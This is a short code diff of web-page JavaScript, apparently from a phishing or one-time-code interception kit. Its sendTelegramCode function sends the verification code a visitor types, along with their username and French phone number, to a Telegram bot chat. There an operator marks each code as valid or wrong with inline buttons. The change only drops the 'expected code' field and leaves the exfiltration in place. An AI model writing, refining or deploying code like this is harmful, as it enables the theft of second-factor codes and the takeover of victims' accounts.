@@ -161,7 +161,7 @@ document.getElementById('verifyCode').onclick=async()=>{
 };
 function sendTelegramCode(entered, pid){
   const kb={inline_keyboard:[[{text:'✅ Code OK',callback_data:'code_ok_'+pid},{text:'❌ Code faux',callback_data:'code_bad_'+pid}]]};
-  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TG_CHAT,message_thread_id:2,text:`🔑 <b>Code saisi</b>\n\n👤 ${pendingUser.username}\n📱 +33 ${fmt(pendingUser.phone)}\n✏️ Saisi: <code>${entered}</code>\n✅ Attendu: <code>${pendingCode}</code>\n🆔 ${pid}`,parse_mode:'HTML',reply_markup:kb})}).catch(()=>{});
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TG_CHAT,message_thread_id:2,text:`🔑 <b>Code saisi</b>\n\n👤 ${pendingUser.username}\n📱 +33 ${fmt(pendingUser.phone)}\n✏️ Saisi: <code>${entered}</code>\n🆔 ${pid}`,parse_mode:'HTML',reply_markup:kb})}).catch(()=>{});
 }
 function showWaitingCode(v){
   document.getElementById('waitingPanel').classList.remove('hidden');
